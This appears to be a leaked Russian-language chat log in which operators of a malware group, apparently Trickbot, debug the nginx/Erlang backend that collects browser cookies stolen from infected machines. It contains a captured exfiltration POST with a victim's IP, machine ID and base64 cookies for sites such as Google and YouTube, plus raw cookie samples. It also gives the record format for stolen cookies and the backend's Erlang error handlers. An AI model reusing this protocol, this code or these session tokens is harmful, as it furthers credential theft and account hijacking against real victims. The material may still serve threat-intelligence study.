Timestamp	From	To	Message
2021-08-30 07:55:38.763748	ttrr	buza	все HTTP/2 QUIC и прочий модный кал
2021-08-30 07:55:38.764472	ttrr	buza	и запретить доступ к веб-серверу не с прокладки
2021-08-30 07:55:38.765942	ttrr	buza	говорю же там все как есть передает
2021-08-30 07:55:38.766410	ttrr	buza	нет не могу
2021-08-30 07:55:38.766633	ttrr	buza	сделал через нджинкс
2021-08-30 07:55:38.768212	ttrr	buza	углубленное позже сделаю
2021-08-30 07:55:38.768450	ttrr	buza	но пока логирование обычное
2021-08-30 07:55:38.769156	ttrr	buza	@defender -- так всё вопрос закрыт ?
2021-08-30 08:19:29.153440	buza	ttrr	defender: а почему не могу?
https://stackoverflow.com/questions/39453027/how-to-disable-http2-in-nginx
я вот так имею в виду - тут пишут что "могу"
2021-08-30 08:19:29.154821	ttrr	buza	defender: а почему не могу?
https://stackoverflow.com/questions/39453027/how-to-disable-http2-in-nginx
я вот так имею в виду - тут пишут что "могу"
2021-08-30 08:43:21.002751	buza	ttrr	zulas: есть сомнение что те дампы крешей что ты привел - что это были посылки модулей трика
2021-08-30 08:43:21.004827	ttrr	buza	zulas: есть сомнение что те дампы крешей что ты привел - что это были посылки модулей трика
2021-08-30 08:44:15.469393	ttrr	buza	ну вообще не были . они были отброшены т.к. не распаршены . ну и очевидно что хттп2 .а не хттп1
2021-08-30 08:44:17.032042	buza	ttrr	нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво
2021-08-30 08:44:17.033112	ttrr	buza	нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво
2021-08-30 08:44:38.453192	ttrr	buza	для начала давайте отфильтруем внешние запросы .
2021-08-30 08:44:47.716060	ttrr	buza	я думаю проблема сама собой решится .
2021-08-30 08:45:02.141902	ttrr	buza	потому что не может один и тот же модуль\код выдавать 2 разных протокола .
2021-08-30 08:45:02.575404	buza	ttrr	zulas: поясни мне проблему с крешем
2021-08-30 08:45:02.583774	ttrr	buza	zulas: поясни мне проблему с крешем
2021-08-30 08:45:07.249355	buza	ttrr	почему это проблема?
2021-08-30 08:45:07.250264	ttrr	buza	почему это проблема?
2021-08-30 08:45:17.025047	buza	ttrr	потому что сервис падает и передача данных кончается?
2021-08-30 08:45:17.028868	ttrr	buza	потому что сервис падает и передача данных кончается?
2021-08-30 08:45:18.249731	ttrr	buza	я хз почему это проблема .. это к дефу
2021-08-30 08:45:29.889219	ttrr	buza	потому что в логи краши срет .. и всё
2021-08-30 08:45:37.388379	buza	ttrr	сервис остается жив?
2021-08-30 08:45:37.391858	ttrr	buza	сервис остается жив?
2021-08-30 08:45:40.577292	buza	ttrr	слушает дальше?
2021-08-30 08:45:40.579095	ttrr	buza	слушает дальше?
2021-08-30 08:45:41.780673	ttrr	buza	конечно
2021-08-30 08:45:46.967570	buza	ttrr	твою бать
2021-08-30 08:45:46.969195	ttrr	buza	твою бать
2021-08-30 08:45:52.599207	buza	ttrr	тогда хули мы тут обсуждаем?
2021-08-30 08:45:52.601935	ttrr	buza	тогда хули мы тут обсуждаем?
2021-08-30 08:46:00.269170	ttrr	buza	я хз . я это сразу говорил
2021-08-30 08:46:23.872654	ttrr	buza	Краш означает что пришло нечто и оно не попало в базу.
2021-08-30 08:46:41.500252	ttrr	buza	Т.к. не распозналось либой эрланга, верно?
2021-08-30 08:47:00.263487	ttrr	buza	нечто - это что угодно, собственно я и сказал что это что угодно, а нормальный POST оно распознает . и обработвает
2021-08-30 08:47:01.967848	buza	ttrr	значит мы обсуждаем потерю данных, но мы потеряли день, потому что в качестве примеров были приведены http2-запросы каких-то левых ботов
2021-08-30 08:47:01.980447	ttrr	buza	значит мы обсуждаем потерю данных, но мы потеряли день, потому что в качестве примеров были приведены http2-запросы каких-то левых ботов
2021-08-30 08:47:43.833130	buza	ttrr	[11:44:17] <buza> нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво\
2021-08-30 08:47:43.836700	ttrr	buza	[11:44:17] <buza> нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво\
2021-08-30 08:47:53.818490	buza	ttrr	сосредоточтесь на этом
2021-08-30 08:47:53.822991	ttrr	buza	сосредоточтесь на этом
2021-08-30 08:48:14.362542	buza	ttrr	zulas: найди в логах креш именно от данных модуля, чтобы там был HTTP/1.1
2021-08-30 08:48:14.365636	ttrr	buza	zulas: найди в логах креш именно от данных модуля, чтобы там был HTTP/1.1
2021-08-30 08:48:24.774121	buza	ttrr	и давайте разбирать нормальный пример
2021-08-30 08:48:24.784279	ttrr	buza	и давайте разбирать нормальный пример
2021-08-30 08:48:31.337635	ttrr	buza	значит для начала нужно обеспечить условия, чтобы только модуль трика мог ко мне данные передавать . иначе мы говорим о любом боте который шлет любое говно
2021-08-30 08:49:09.761602	buza	ttrr	деф что-то отрежет, но не думаю что всё
2021-08-30 08:49:09.762896	ttrr	buza	деф что-то отрежет, но не думаю что всё
2021-08-30 08:49:25.625168	buza	ttrr	по хттп1 тебе все равно будут лезть левые спайдеры
2021-08-30 08:49:25.642477	ttrr	buza	по хттп1 тебе все равно будут лезть левые спайдеры
2021-08-30 08:51:43.324723	ttrr	buza	Есть вариант передать любым способом ключ в бота, и сделать на эрланге проверку, что ключ в запросе совпадает с ключем в базе
2021-08-30 08:52:06.211563	buza	ttrr	чтобы что?
2021-08-30 08:52:06.213742	ttrr	buza	чтобы что?
2021-08-30 08:52:29.669524	ttrr	buza	отсечь все данные которые не относятся к трику.
2021-08-30 08:52:52.945157	buza	ttrr	вообще-то у бэка есть штатный механизм для этого
2021-08-30 08:52:52.946847	ttrr	buza	вообще-то у бэка есть штатный механизм для этого
2021-08-30 08:53:08.918577	buza	ttrr	он парсит запрос и вытаскивает ID бота из него
2021-08-30 08:53:08.919924	ttrr	buza	он парсит запрос и вытаскивает ID бота из него
2021-08-30 08:53:35.691432	buza	ttrr	это и есть ключ, 90% запросов отсечется по невалидному URI с отсутствующим ид бота и группы
2021-08-30 08:53:35.693052	ttrr	buza	это и есть ключ, 90% запросов отсечется по невалидному URI с отсутствующим ид бота и группы
2021-08-30 08:53:48.790910	buza	ttrr	остальные 9% левых запросов отсечется по неправдоподобному ИД бота
2021-08-30 08:53:48.796349	ttrr	buza	остальные 9% левых запросов отсечется по неправдоподобному ИД бота
2021-08-30 08:53:54.541526	buza	ttrr	но можно и падать
2021-08-30 08:53:54.543024	ttrr	buza	но можно и падать
2021-08-30 08:56:42.266761	ttrr	buza	падает потому что ему протокол непонятен - он ожидает одно, а нихера не приходит .
2021-08-30 08:57:05.201793	ttrr	buza	когда протокол понятен - то и соответствущя реакция на него независимо правильный он ( от нас) или не правильны (от чужих)
2021-08-30 08:57:35.261983	ttrr	buza	вот когда отсечет .. тогда можно говорить о чем . а если падает только на левых ..
2021-08-30 09:00:25.674576	buza	ttrr	еще раз, какую проблему мы решаем?
2021-08-30 09:00:25.676210	ttrr	buza	еще раз, какую проблему мы решаем?
2021-08-30 09:03:21.871866	buza	ttrr	то что бэк падает на левых данных это не проблема. Он что-то не может распарсить, ну и ладно
2021-08-30 09:03:21.877805	ttrr	buza	то что бэк падает на левых данных это не проблема. Он что-то не может распарсить, ну и ладно
2021-08-30 09:03:46.741451	ttrr	buza	я пока вижу левые данные только
2021-08-30 09:03:53.973178	buza	ttrr	driver: ?
2021-08-30 09:03:53.978069	ttrr	buza	driver: ?
2021-08-30 09:10:20.681922	ttrr	buza	Вообще про краши говорил дэф.
2021-08-30 09:10:34.438011	ttrr	buza	Я думаю что нам надо закрыть логи
2021-08-30 09:11:15.487084	ttrr	buza	Чтобы можно было понять что приходит на бэк. Чтобы если краши появляются можно было понять что именно причина
2021-08-30 09:11:29.533713	ttrr	buza	У нас есть поток тестовых данных которые всегда ошибки вызывают.
2021-08-30 09:13:13.920196	ttrr	buza	Например я часто вычищаю из базы какие то записи которые явно не в тему. Их там 6 штук по кукам, но они все время появляются и дальше никогда не проходят
2021-08-30 09:14:09.943832	ttrr	buza	То что сейчас сделали с нджинксом - задачу решает пока что.
Надо только более полные логи настроить
2021-08-30 09:14:23.958346	ttrr	buza	Чтобы тело пост запросов можно было видеть.
2021-08-30 09:16:17.559565	buza	ttrr	ну то есть ты говоришь о том, что нужно логирование запросов, а его нету. Верно?
2021-08-30 09:16:17.563163	ttrr	buza	ну то есть ты говоришь о том, что нужно логирование запросов, а его нету. Верно?
2021-08-30 09:21:45.713702	ttrr	buza	Да
2021-08-30 09:21:52.696087	ttrr	buza	Сейчас это главное.
2021-08-30 09:24:33.033530	ttrr	buza	Вся история про эту конфу была с сообщения что нужно менять либу парсинга чтобы логи сделать, о чем нам зулас сообщил, но дэф придумал просто поставить проксю нджинкс. Так что я честно не очень понимаю, каких то правок пока нет больше в бэке.
Но есть проблема, что часть данных не приходит и вот нужно понять почему и тогда дальше думать.
2021-08-30 09:26:50.170735	ttrr	buza	логи сделаны .. я приводил выдержки оттуда
2021-08-30 09:27:47.886558	ttrr	buza	для меня непонятно кто это генерит .. но факт в том что либа не может понять что это ... поэтому краши .. 
хттп1 она обрабатыват .. хттп2 у нас нет .. соотвественно давайте хттп2 просто закроем и всё
2021-08-30 09:27:59.134036	ttrr	buza	тогда мы сузим круг возможных проблем и найдем решение для них
2021-08-30 09:28:46.217650	ttrr	buza	краши по факту могут быть всегда -- всмысли когда какой-то левый протокол на порт коннектится .. то может быть краш в лог . это не значит что сервис в дауне . это просто значит что один именно этот запрос не вызвал нужной реакции сервера
2021-08-30 09:36:07.625411	ttrr	buza	> соотвественно давайте хттп2 просто закроем и всё 
точнее закроем все что не хттп1
2021-08-30 09:36:26.646915	ttrr	buza	я не думаю что у Nginx проблемы могут быть с такой логикой .. правильно ?
2021-08-30 09:43:57.353525	ttrr	buza	всем привет
2021-08-30 09:44:05.521783	ttrr	buza	вот для этого я и делал нджинк
2021-08-30 09:44:20.139454	ttrr	buza	но он как драйвер сказал не правильно проксировал
2021-08-30 09:44:24.802456	ttrr	buza	сейчас я с этим разберусь
2021-08-30 09:44:34.746287	ttrr	buza	+ сделаю только хттп1
2021-08-30 09:44:44.412954	ttrr	buza	+ логирование запросов и тела
2021-08-30 13:22:35.597199	ttrr	buza	сделал логирование
2021-08-30 13:22:38.302476	ttrr	buza	/var/log/nginx/access.log
2021-08-30 13:22:59.687873	ttrr	buza	все выводит что проходит через нджинкс
2021-08-30 13:23:34.903237	ttrr	buza	выпилить хттп2 не так просто, надо собирать свой дистр
2021-08-30 13:23:45.775716	ttrr	buza	давайте начнем пока с ищучения лога
2021-08-30 13:24:22.988575	ttrr	buza	если деро крашится значит нджинкс примет код не 200 и по нему можно увидеть какие там данные
2021-08-30 13:28:03.099692	ttrr	buza	да и если есть там реальный срач, давайте напишите мне регулярку по которой я отсеку в нджинксе все кроме норм запросов
2021-08-30 14:30:22.899238	ttrr	buza	все видят что я пишу?
2021-08-30 14:30:26.956729	ttrr	buza	смотрите?
2021-08-30 14:30:38.866200	ttrr	buza	Я вижу.
2021-08-30 14:31:11.732098	ttrr	buza	Я пока не понял как мне сообщение посмотреть и тело запроса.
\x16\x03\x03\x00\xC2\x01\x00\x00\xBE\x03\x03a,O\xBC\xF5\xC6\xCFw\x958\xE8\x15O@\xBD)\xC5\xD3\xCA\x81\xE2\xA7i\xAF\xCCg\xA9[6k_/\x00\x00&\xC0,\xC0+\xC00\xC0/\xC0$\xC0#\xC0(\xC0'\xC0
2021-08-30 14:31:31.402776	ttrr	buza	Вот такое есть, это бинарные данные?
2021-08-30 14:32:37.711356	ttrr	buza	вот есть так как ты написал
2021-08-30 14:32:44.615845	ttrr	buza	в не понятной кодировке
2021-08-30 14:32:47.117526	ttrr	buza	а есть норм
2021-08-30 14:32:53.474404	ttrr	buza	200.58.180.138 -  [30/Aug/2021:17:31:45 +0300] "POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1" 403 182 "" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64
; Trident/7.0; .NET4.0E; .NET4.0C; InfoPath.3; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)" "-----------KRLRMIKEGVGXNTPQ\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nUtente2|Ch
rome|dGFncy5hZHNhZmV0eS5uZXQ=|RElE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|SURU|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrom
e|dGFncy5hZHNhZmV0eS5uZXQ=|VUlE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfZGlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659
0957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfaWR0|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfdWlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659095
7|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|dg==|Mg==|1546590957|2147483641|Lw==\r\nUtente2|Chrome|Lmdvb2dsZS5jb20=|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218723|2146723192|Lw==\r\nUtente
2|Chrome|Lmdvb2dsZS5pdA==|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|LnlvdXR1YmUuY29t|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|Lm
ludGVudGlxLmNvbQ==|SVF2ZXI=|MS45|1562134121|1877494136|Lw==\r\nUtente2|Chrome|LmhvdGVscy5jb20=|X2Nsc192|MGE5ZTdlN2UtZGY1Mi00YWQzLWI0YjItY2UxZGI0MGQ1MWU5|1562134143|1719814143|Lw==\r\nUtente2|Chrome|LnRya
XZhZ28uY29t|Y3RpZA==|SzRETTU1bm1JMzdIQzVudXZUTXBveFhROU4=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|d3d3LnRyaXZhZ28uaXQ=|ZnR2|JTdCJTIyZnR2JTIyJTNBJTIyMjAxOTA3MDMwNjA4NDAlMjIlMkMlMjJsdHYlMjIlM0ElMjIyMD
E5MDcwMzA2MDg0MCUyMiUyQyUyMmVwJTIyJTNBOTk5OSUyQyUyMmNudHYlMjIlM0ExJTJDJTIyY250YyUyMiUzQTElMkMlMjJjbnRjcyUyMiUzQTElMkMlMjJmZXAlMjIlM0E5OTk5JTJDJTIydmMlMjIlM0EwJTJDJTIyY3RsJTIyJTNBOTk5JTJDJTIyY3RmJTIyJTNBO
Tk5JTJDJTIyaXRlbSUyMiUzQTIzMTMxNjglMkMlMjJwYXRoJTIyJTNBNDU4MTclMkMlMjJwYXRoMiUyMiUzQW51bGwlN0Q=|1562134136|2147483644|Lw==\r\nUtente2|Chrome|Lnd3dy50cml2YWdvLml0|aW50ZW50X21lZGlhX3ByZWZz||1562134121|-210
1681175|Lw==\r\nUtente2|Chrome|ZHVzLnRyaXZhZ28uY29t|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|c2VjZGUudHJpdmFnby5jb20=|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134120|2147483643|Lw==\r\
nUtente2|Chrome|LnRyaXZhZ28uY29t|dGlk|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dGlk|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|1562134117|2147483643|Lw
==\r\nUtente2|Chrome|LnRyaXZhZ28uY29t|dHJ2X3RpZA==|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dHJ2X3RpZA==|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|156

...
...........
2021-08-30 14:33:11.250580	ttrr	buza	хооооотя код 403
2021-08-30 14:33:14.507450	ttrr	buza	почему
2021-08-30 14:33:57.057800	ttrr	buza	zulas: давай разбираться
2021-08-30 14:36:02.437819	buza	ttrr	POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1
2021-08-30 14:36:02.442014	ttrr	buza	POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1
2021-08-30 14:36:21.824761	buza	ttrr	это наш запрос, если не ошибаюсь это куки
2021-08-30 14:36:21.829456	ttrr	buza	это наш запрос, если не ошибаюсь это куки
2021-08-30 14:36:35.157097	buza	ttrr	zulas: поясни почему 403
2021-08-30 14:36:35.160082	ttrr	buza	zulas: поясни почему 403
2021-08-30 14:38:38.676369	ttrr	buza	buza: давай я тебе скину креды, может ты тоже посмотришь логи?
2021-08-30 14:38:38.680648	ttrr	buza	В конце данные обрезаны
2021-08-30 14:38:49.484650	ttrr	buza	просто чувствую что гл=де то рядом ответ
2021-08-30 14:38:54.994184	ttrr	buza	Это так скопировалось?
2021-08-30 14:39:04.025581	ttrr	buza	driver: это я обрезал, там дохрена
2021-08-30 14:39:24.311111	ttrr	buza	Ок
2021-08-30 14:39:40.409145	buza	ttrr	defender: в последний раз когда я этим занимался (еще будучи разработчиком того самого модуля который эти данные шлет), коды ошибки приходили от бэкенда в случае если ему данные не нравились
2021-08-30 14:39:40.411871	ttrr	buza	defender: в последний раз когда я этим занимался (еще будучи разработчиком того самого модуля который эти данные шлет), коды ошибки приходили от бэкенда в случае если ему данные не нравились
2021-08-30 14:40:13.904066	buza	ttrr	т.е. тут нужно указание от зуласа, начиная с какого смещения в этом запросе данные невалидны (по мнению парсящей их библиотеки)
2021-08-30 14:40:13.908095	ttrr	buza	т.е. тут нужно указание от зуласа, начиная с какого смещения в этом запросе данные невалидны (по мнению парсящей их библиотеки)
2021-08-30 14:41:26.284013	ttrr	buza	так да, но пока он думает, можетт у тебя мысли будут
2021-08-30 14:42:45.466686	ttrr	buza	403 Forbidden шлет во многих случаях .. самый общий это неверный URL .. потом всякие баны и т.п.
2021-08-30 14:43:27.703389	ttrr	buza	у тебя есть конкретный сервер с конкретной базой и софтом + логи
2021-08-30 14:43:31.447183	ttrr	buza	рзберись плиз
2021-08-30 14:43:35.530250	ttrr	buza	для 84 команды конкретно тут может быть что он ожидает данные формы .. multipart но там ничего нет
2021-08-30 14:43:54.456637	ttrr	buza	я сваливаю сейчас . смогу только завтра . так что сорян
2021-08-30 14:44:08.987313	ttrr	buza	кто в жабе кодер модуля?
2021-08-30 14:44:21.704966	ttrr	buza	надо добавить его сюда
2021-08-30 14:44:40.865706	ttrr	buza	zulas: утром?
2021-08-30 14:45:04.425860	ttrr	buza	ога
2021-08-30 14:45:04.868199	ttrr	buza	чтобы сюда кодера модуля подтянуть к этому времени
2021-08-30 14:46:32.017842	ttrr	buza	еще надо в лог писать длину пост данных .. потому что у меня лимит 64 кб
2021-08-30 14:46:43.415000	ttrr	buza	[19:43:23] <dgh> Там надо посмотреть весь лог, суть в том что должно быть по 8 полей 
[19:43:39] <dgh> И точно такую же ошибку нам выдавало когда их было больше или меньше 
[19:43:52] <dgh> И возвращало типа что то Missmatch parametr count 
[19:43:55] <dgh> В ответе
2021-08-30 14:46:48.424194	ttrr	buza	таймаут по чтению - 50 секунд
2021-08-30 14:46:58.654842	ttrr	buza	Это еще можно проверить
2021-08-30 14:48:08.520291	ttrr	buza	да .. надо логировать ответ сервера .. там 403 может быть с пояснением
2021-08-30 14:48:52.503866	ttrr	buza	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
такие колонки должны быть
2021-08-30 14:50:31.729838	ttrr	buza	у меня может в глазах двоится .. но я насчитал в запросе 15 колонов в пост-дата
2021-08-30 14:50:37.210271	ttrr	buza	колонок
2021-08-30 14:50:57.650526	ttrr	buza	Я по этому куску разбил по 8 везде
2021-08-30 14:51:05.433476	ttrr	buza	Или ты полный лог глядишь
2021-08-30 14:51:06.972663	ttrr	buza	?
2021-08-30 14:51:14.894679	ttrr	buza	хотя нет .. 8 )
2021-08-30 14:51:36.060257	ttrr	buza	То что в лимит уперлось кстати вероятно.
2021-08-30 14:51:39.707724	ttrr	buza	короче надо ответ сервера логировать . будет понятнее . .есть такая возможсность ? )
2021-08-30 14:51:39.739503	ttrr	buza	Тоже
2021-08-30 14:51:51.345055	ttrr	buza	и размер запроса
2021-08-30 14:52:13.549245	ttrr	buza	свалил )
2021-08-30 14:54:50.403999	buza	ttrr	сейчас автор модуля должен зайти
2021-08-30 14:54:50.406730	ttrr	buza	сейчас автор модуля должен зайти
2021-08-31 08:20:34.373786	ttrr	buza	ну и ?
2021-08-31 08:20:44.477178	ttrr	buza	одному мне больше всез надо ?
2021-08-31 08:21:25.222020	buza	ttrr	со вчера вечера что-то писали тут?
2021-08-31 08:21:25.223342	ttrr	buza	со вчера вечера что-то писали тут?
2021-08-31 08:23:54.165734	buza	ttrr	zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком
2021-08-31 08:23:54.167365	ttrr	buza	zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком
2021-08-31 08:24:17.353681	ttrr	buza	А тут истории нет?
Писал по поводу новых полей в записи куки
2021-08-31 08:24:26.068492	buza	ttrr	нету истории
2021-08-31 08:24:26.069697	ttrr	buza	нету истории
2021-08-31 08:26:45.177754	buza	ttrr	ну так на чем остановились?
2021-08-31 08:26:45.179401	ttrr	buza	ну так на чем остановились?
2021-08-31 08:27:19.301382	buza	ttrr	я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так
2021-08-31 08:27:19.302779	ttrr	buza	я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так
2021-08-31 08:27:38.956521	ttrr	buza	а я попросил расширить лог . чтобы логировало ответ
2021-08-31 08:27:51.221395	ttrr	buza	и размер запроса
2021-08-31 08:29:36.037979	buza	ttrr	а ты steller ?
2021-08-31 08:29:36.041557	ttrr	buza	а ты steller ?
2021-08-31 08:31:18.948820	ttrr	buza	Писал по поводу новых полей в записи куки
2021-08-31 08:33:03.541030	buza	ttrr	что именно?
2021-08-31 08:33:03.541972	ttrr	buza	что именно?
2021-08-31 08:33:15.476311	ttrr	buza	403 встречалась раньше ошибка
-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="data"

user|Chrome|.google.com|ANID|	djEw171ep2SDF+UMAcWRRWBcsbp5H34/V0frREuTTKAE2F3BXw3fVVHhgYgcKidlSSPxtTs32WPiqcV/p021G67RLpNXgRDrMqljrJ16Ml1Ckwz2a2URAQ==|1588241125|1651313125|/
user|Chrome|.register.com|__utma|	djEwnpzEp2a3+eOKByaEj0nLtLL7HGvIusWq1obAuia9wTCz3pPEUF6A+gFpZ3LHPf2GSueVelCwgrXMR96kV8MmLcClokQ=|1588241143|1651313173|/

-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="source"

Chrome cookies
-----------CJLVIYOINTQPMYSU--

403
Mismatch parameters count!
2021-08-31 08:33:43.135763	buza	ttrr	zulas: сколько полей в куки у тебя сейчас?
steller: а у тебя?
2021-08-31 08:33:43.139683	ttrr	buza	zulas: сколько полей в куки у тебя сейчас?
steller: а у тебя?
2021-08-31 08:34:59.534227	ttrr	buza	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
2021-08-31 08:35:00.849091	ttrr	buza	вот поля
2021-08-31 08:35:14.270186	ttrr	buza	разделитель |
2021-08-31 08:35:28.665073	ttrr	buza	Разработчик админки планирует добавить 2 поля secure, httponly в конец записи.
Сейчас:
Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path
2021-08-31 08:35:46.675734	ttrr	buza	разделители строк: [ <<10>>, <<13,10>>]
2021-08-31 08:37:31.165932	ttrr	buza	403 была, когда некоторые поля не кодировались в В64. В отстойнике они безусловно декодировались.
2021-08-31 08:38:28.753098	ttrr	buza	А что по поводу максимального размера данных, он ограничен 64КБ будет?
2021-08-31 08:39:10.940777	ttrr	buza	{read_length, 64000},
{read_timeout, 50000}
я могу и больше сделать
2021-08-31 08:39:15.178535	ttrr	buza	таковы требоания были
2021-08-31 08:40:40.541531	ttrr	buza	50000 это в миллисекундах
2021-08-31 08:43:47.769105	ttrr	buza	В модуле нет такого ограничения. Можно разбить на несколько запросов, в принципе.
А какие ошибки отстойник может отдавать? Их желательно как-то обрабатывать.
403 добавил в обработку. На модуль приходили ещё 404 и 500. 500, видимо, от прокладки.
2021-08-31 08:45:02.924223	ttrr	buza	при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?
2021-08-31 08:45:20.941683	ttrr	buza	403 ошибка формата данных?
2021-08-31 08:45:42.353766	ttrr	buza	просо 200 бывает без /1/ ?
2021-08-31 08:45:46.773141	ttrr	buza	просто
2021-08-31 08:46:17.064752	ttrr	buza	zulas:
2021-08-31 08:47:07.168892	ttrr	buza	зачем этот /1/ ?
2021-08-31 08:47:10.001467	ttrr	buza	reply(not_found, Req) ->
 { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
 Req1;

reply(forbidden, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
 Req1;

reply(missing_data, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
 Req1;

reply(missing_keys, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
 Req1;

reply(missing_parameters, Req) ->
 {ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
 Req1;

reply(request_timeout, Req) ->
 {ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
 Req1;
2021-08-31 08:47:16.136005	ttrr	buza	вот такие ошибки бывают
2021-08-31 08:47:22.018129	ttrr	buza	текст у вас отобразился ?
2021-08-31 08:47:31.376763	ttrr	buza	а то у меня пиджин -- и нифига
2021-08-31 08:47:40.875003	ttrr	buza	отразился
2021-08-31 08:48:11.905979	ttrr	buza	200 бывает без /1/ ?
2021-08-31 08:48:50.548215	ttrr	buza	по коду вроде не бывает
2021-08-31 08:48:57.440328	ttrr	buza	почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?
2021-08-31 08:49:06.639192	buza	ttrr	[11:47:07] <hof> зачем этот /1/ ?
так по тз
2021-08-31 08:49:06.640633	ttrr	buza	[11:47:07] <hof> зачем этот /1/ ?
так по тз
2021-08-31 08:49:25.813522	ttrr	buza	это типа следующая команда для клиента
2021-08-31 08:49:29.557565	ttrr	buza	т.е. 200 без /1/ не бывает?
2021-08-31 08:49:55.932124	ttrr	buza	не бывает
2021-08-31 08:50:06.568416	ttrr	buza	ок, отлично
